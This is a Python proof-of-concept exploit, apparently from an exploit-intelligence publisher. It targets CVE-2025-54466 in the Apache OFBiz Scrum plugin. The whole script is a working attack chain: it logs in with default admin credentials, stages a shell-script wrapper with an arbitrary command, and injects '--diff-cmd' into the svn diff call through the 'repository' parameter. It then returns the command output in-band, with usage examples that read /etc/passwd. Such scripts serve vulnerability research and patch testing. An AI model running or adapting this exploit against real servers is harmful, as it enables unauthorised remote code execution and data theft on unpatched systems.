#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache OFBiz Scrum Plugin — RCE via SVN Argument Injection (svn diff --diff-cmd)
# CVE            : CVE-2025-54466
# Vendor         : Apache Software Foundation
# Product        : Apache OFBiz (Scrum Plugin)
# Affected       : All versions before 24.09.02
# Type           : CWE-94 - Code Injection
# CVSS           : 9.8 (Critical)
# Platform       : Java / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-03-01
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-54466 — RCE via SVN argument injection in Apache OFBiz Scrum plugin.

The viewScrumRevision() method in ScrumServices.java concatenates the
'repository' HTTP parameter into an 'svn diff' command passed to
Runtime.exec(String). Injecting '--diff-cmd=/path/to/binary' causes
SVN to execute an arbitrary binary with output returned in-band.

ATTACK CHAIN:
    1. Authenticate to OFBiz (demo creds admin/ofbiz)
    2. Stage a shell script wrapper (written via bind mount)
    3. Inject --diff-cmd=<script> via the repository parameter
    4. Read command output from the HTTP response (in-band RCE)

PREREQUISITES:
    - Target running Apache OFBiz < 24.09.02 with scrum plugin
    - Valid credentials (default: admin/ofbiz)
    - SVN client installed on target (standard in OFBiz deployments)

REFERENCES:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-54466
    - https://github.com/advisories/GHSA-7vg9-49f9-pfxr

Usage:
    python3 poc.py localhost 8443
    python3 poc.py localhost 8443 --command "cat /etc/passwd"
"""

import sys
import ssl
import html
import re
import os
import stat
import urllib.request
import urllib.parse
import urllib.error
import http.cookiejar
import argparse
import textwrap


# ──────────────────────────────────────────
# Configuration
# ──────────────────────────────────────────
DEFAULT_PORT = 8443
DEFAULT_USERNAME = "admin"
DEFAULT_PASSWORD = "ofbiz"
DEFAULT_COMMAND = "id"
# SVN working copy path inside the container (must have >=2 revisions with changes)
SVN_WC_PATH = "/home/ofbiz/svnwc"

# Paths for the helper script (bind-mounted: host ./poc ↔ container /opt/poc)
POC_DIR = os.path.dirname(os.path.abspath(__file__))
HELPER_SCRIPT_LOCAL = os.path.join(POC_DIR, ".helper_v1.sh")
HELPER_SCRIPT_CONTAINER = "/opt/poc/.helper_v1.sh"


def create_https_context():
    """Create an SSL context that skips certificate verification (self-signed cert)."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def build_opener():
    """Build a urllib opener with cookie handling and HTTPS support."""
    cookie_jar = http.cookiejar.CookieJar()
    cookie_handler = urllib.request.HTTPCookieProcessor(cookie_jar)
    https_handler = urllib.request.HTTPSHandler(context=create_https_context())
    opener = urllib.request.build_opener(cookie_handler, https_handler)
    return opener, cookie_jar


def authenticate(opener, base_url, username, password):
    """
    Step 1: Authenticate to OFBiz and obtain a session cookie.

    OFBiz uses form-based authentication. After a successful POST to
    /scrum/control/login, the server sets a JSESSIONID cookie.
    """
    login_url = f"{base_url}/scrum/control/login"
    data = urllib.parse.urlencode({
        "USERNAME": username,
        "PASSWORD": password,
    }).encode("utf-8")

    print(f"[*] Authenticating as '{username}' to {login_url}")
    try:
        resp = opener.open(login_url, data, timeout=30)
        body = resp.read().decode("utf-8", errors="replace")
        # Check if login succeeded — successful login redirects to scrum main page
        if "ScrumProduct" in body or "main-decorator" in body:
            print(f"[+] Authentication successful — session established")
            return True
        elif "login" in body.lower() and "error" in body.lower():
            print(f"[-] Authentication failed — invalid credentials")
            return False
        else:
            # May still have succeeded; OFBiz sometimes renders the main page
            print(f"[*] Auth response received (HTTP {resp.status}), proceeding...")
            return True
    except urllib.error.URLError as e:
        print(f"[-] Connection failed: {e}")
        return False


def stage_helper_script(command):
    """
    Step 2: Create a helper shell script via bind mount.

    SVN's --diff-cmd passes extra arguments (-u -L label1 -L label2 file1 file2)
    to the external diff program. Most standard binaries (id, whoami, etc.) fail
    when given these unexpected arguments. A shell script wrapper ignores them
    and executes our payload.

    The script is written to the local ./poc/ directory, which is bind-mounted
    into the container at /opt/poc/. The exploit then references the container path.
    """
    script_content = textwrap.dedent(f"""\
        #!/bin/sh
        # CVE-2025-54466 PoC helper — ignores SVN diff args, runs payload
        {command}
    """)

    print(f"[*] Staging helper script at {HELPER_SCRIPT_LOCAL}")
    with open(HELPER_SCRIPT_LOCAL, "w") as f:
        f.write(script_content)
    os.chmod(HELPER_SCRIPT_LOCAL, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
    print(f"[+] Helper script staged (bind-mounted at {HELPER_SCRIPT_CONTAINER})")
    return script_content


def trigger_exploit(opener, base_url, command_binary_or_script, svn_wc_path=SVN_WC_PATH, revision=2):
    """
    Step 3: Trigger the SVN argument injection to execute our command.

    The vulnerable code constructs:
      svn diff -r{revision-1}:{revision} {repository}

    We set repository to: --diff-cmd={script_path} {svn_wc_path}

    After Runtime.exec(String) tokenization:
      ["svn", "diff", "-r1:2", "--diff-cmd={script_path}", "{svn_wc_path}"]

    SVN diffs revision 1 and 2, invoking our script as the external diff tool.
    The script's stdout is captured and returned in the HTTP response.
    """
    # Build the malicious repository parameter
    payload = f"--diff-cmd={command_binary_or_script} {svn_wc_path}"

    # URL-encode the payload for the query string
    params = urllib.parse.urlencode({
        "revision": str(revision),
        "repository": payload,
    })

    exploit_url = f"{base_url}/scrum/control/RevisionInfo?{params}"

    print(f"[*] Sending exploit to: /scrum/control/RevisionInfo")
    print(f"[*] Payload: repository={payload}")
    print(f"[*] Resulting svn command: svn diff -r{revision-1}:{revision} {payload}")

    try:
        resp = opener.open(exploit_url, timeout=30)
        body = resp.read().decode("utf-8", errors="replace")
        return body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        print(f"[!] HTTP {e.code} — may still contain output")
        return body
    except urllib.error.URLError as e:
        print(f"[-] Request failed: {e}")
        return None


def extract_command_output(response_html):
    """
    Step 4: Parse the command output from the HTTP response.

    The FreeMarker template (Revision.ftl) renders:
      <pre>${result.logMessage}</pre>   — output from svn log
      <pre>${result.diffMessage}</pre>  — output from svn diff (contains our RCE output)

    The diff output includes SVN's index header followed by our command output.
    """
    if not response_html:
        return None, None

    # Find all <pre> tag contents
    pre_pattern = re.compile(r'<pre[^>]*>(.*?)</pre>', re.DOTALL)
    matches = pre_pattern.findall(response_html)

    log_output = None
    diff_output = None

    if len(matches) >= 1:
        log_output = html.unescape(matches[0]).strip()
    if len(matches) >= 2:
        diff_output = html.unescape(matches[1]).strip()

    return log_output, diff_output


def parse_rce_output(diff_output):
    """
    Extract clean command output from the SVN diff response.

    The diff output looks like:
      Index: /home/ofbiz/svnwc/test.txt
      ===================================================================
      <actual command output here>

    We strip the SVN index header to get clean output.
    """
    if not diff_output:
        return ""

    lines = diff_output.split('\n')
    clean_lines = []
    skip_header = True

    for line in lines:
        if skip_header:
            # Skip SVN Index: header and separator line
            if line.startswith('Index: ') or line.startswith('=' * 10):
                continue
            skip_header = False
        clean_lines.append(line)

    return '\n'.join(clean_lines).strip()


def cleanup():
    """Remove helper script after exploit."""
    try:
        os.remove(HELPER_SCRIPT_LOCAL)
    except FileNotFoundError:
        pass


def exploit(target_host, target_port, command=DEFAULT_COMMAND,
            username=DEFAULT_USERNAME, password=DEFAULT_PASSWORD):
    """
    Main exploit function — orchestrates the full attack chain.

    1. Authenticate to OFBiz
    2. Stage helper script (via bind mount)
    3. Trigger --diff-cmd injection
    4. Parse and display command output
    """
    base_url = f"https://{target_host}:{target_port}"

    print("=" * 70)
    print("CVE-2025-54466: Apache OFBiz Scrum Plugin — RCE via SVN Argument Injection")
    print("=" * 70)
    print(f"[*] Target: {base_url}")
    print(f"[*] Command: {command}")
    print()

    # ── Step 1: Build HTTP client with cookies ──
    opener, cookie_jar = build_opener()

    # ── Step 2: Authenticate ──
    if not authenticate(opener, base_url, username, password):
        print("[-] EXPLOIT FAILED: Could not authenticate")
        return False
    print()

    # ── Step 3: Stage helper script ──
    # The helper script wraps our command so it runs cleanly despite
    # SVN passing extra diff arguments to the --diff-cmd binary
    stage_helper_script(command)
    print()

    # ── Step 4: Trigger the exploit ──
    print("[*] Triggering SVN argument injection via viewScrumRevision()...")
    response = trigger_exploit(opener, base_url, HELPER_SCRIPT_CONTAINER)

    if response is None:
        print("[-] EXPLOIT FAILED: No response received")
        cleanup()
        return False

    # ── Step 5: Extract and display command output ──
    log_output, diff_output = extract_command_output(response)
    rce_output = parse_rce_output(diff_output)

    print()
    print("=" * 70)
    if rce_output:
        print("[+] EXPLOIT SUCCESSFUL — Command output received in HTTP response:")
        print("=" * 70)
        print()
        print(rce_output)
        print()
        print("=" * 70)
        print(f"[+] Demonstrated: Remote Code Execution as OFBiz service account")
        print(f"[+] Vector: SVN --diff-cmd argument injection via 'repository' parameter")
        print(f"[+] In-band output: Command output returned in HTTP response body")
        cleanup()
        return True
    else:
        print("[-] EXPLOIT STATUS: UNVERIFIED — no command output detected")
        print("=" * 70)
        if diff_output:
            print(f"[*] Raw diff output: {diff_output[:500]}")
        if log_output:
            print(f"[*] Raw log output: {log_output[:500]}")
        cleanup()
        return False


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2025-54466: Apache OFBiz Scrum Plugin RCE PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              %(prog)s localhost                              # Run 'id' on target
              %(prog)s localhost 8443 --command "whoami"      # Run 'whoami'
              %(prog)s localhost 8443 -c "cat /etc/passwd"    # Read /etc/passwd
              %(prog)s localhost --username admin --password ofbiz
        """)
    )
    parser.add_argument("host", nargs="?", default="localhost",
                        help="Target hostname or IP (default: localhost)")
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT,
                        help=f"Target HTTPS port (default: {DEFAULT_PORT})")
    parser.add_argument("-c", "--command", default=DEFAULT_COMMAND,
                        help=f"Command to execute (default: {DEFAULT_COMMAND})")
    parser.add_argument("-u", "--username", default=DEFAULT_USERNAME,
                        help=f"OFBiz username (default: {DEFAULT_USERNAME})")
    parser.add_argument("-p", "--password", default=DEFAULT_PASSWORD,
                        help=f"OFBiz password (default: {DEFAULT_PASSWORD})")

    args = parser.parse_args()

    success = exploit(args.host, args.port, args.command, args.username, args.password)
    sys.exit(0 if success else 1)
